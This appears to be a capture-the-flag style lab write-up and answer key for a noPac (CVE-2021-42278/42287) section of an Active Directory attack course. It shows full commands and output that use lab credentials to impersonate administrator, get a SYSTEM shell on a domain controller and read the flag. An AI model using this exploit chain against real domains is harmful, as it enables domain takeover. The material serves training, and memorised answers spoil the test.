# Section 25: Bleeding Edge Vulnerabilities

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)

**Answer:** `2021-42278&2021-42287`

---

### 2. Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

Context:
```bash
┌─[htb-student@ea-attack01]─[/opt]
└──╼ $cd noPac/
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $ls
noPac.py  README.md  requirements.txt  scanner.py  utils
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-R0OMT95WMSY$"
[*] MachineAccount "WIN-R0OMT95WMSY$" password = Vvt7B7CbT%^4
[*] Successfully added machine account WIN-R0OMT95WMSY$ with password Vvt7B7CbT%^4.
[*] WIN-R0OMT95WMSY$ object = CN=WIN-R0OMT95WMSY,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-R0OMT95WMSY$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-R0OMT95WMSY$
[*] Restored WIN-R0OMT95WMSY$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-R0OMT95WMSY$
[-] Delete computer WIN-R0OMT95WMSY$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd C:\
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>cd C
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>dir C:\
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\

03/31/2022  07:34 AM    <DIR>          Department Shares
04/07/2022  09:31 AM    <DIR>          ExtraSids
09/14/2018  07:19 PM    <DIR>          PerfLogs
04/09/2022  11:59 AM    <DIR>          Program Files
09/14/2018  09:06 PM    <DIR>          Program Files (x86)
03/31/2022  06:09 AM    <DIR>          User Shares
10/06/2021  05:31 AM    <DIR>          Users
08/19/2026  07:44 PM    <DIR>          Windows
03/31/2022  06:12 AM    <DIR>          ZZZ_archive
               0 File(s)              0 bytes
               9 Dir(s)  18,253,705,216 bytes free

C:\Windows\system32>dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users

10/06/2021  05:31 AM    <DIR>          .
10/06/2021  05:31 AM    <DIR>          ..
04/09/2022  11:06 AM    <DIR>          Administrator
11/04/2021  05:17 AM    <DIR>          lab_adm
10/06/2021  08:46 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  18,253,701,120 bytes free

C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop

04/09/2022  11:07 AM    <DIR>          .
04/09/2022  11:07 AM    <DIR>          ..
03/23/2022  04:19 AM    <DIR>          DailyTasks
               0 File(s)              0 bytes
               3 Dir(s)  18,253,635,584 bytes free

C:\Windows\system32>dir C:\Users\Administrator\Desktop\DailyTasks
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop\DailyTasks

03/23/2022  04:19 AM    <DIR>          .
03/23/2022  04:19 AM    <DIR>          ..
03/23/2022  04:29 AM                17 flag.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,271,862,784 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
```

**Answer:** `D0ntSl@ckonN0P@c!`

---

[Back to Module Index](./README.md)
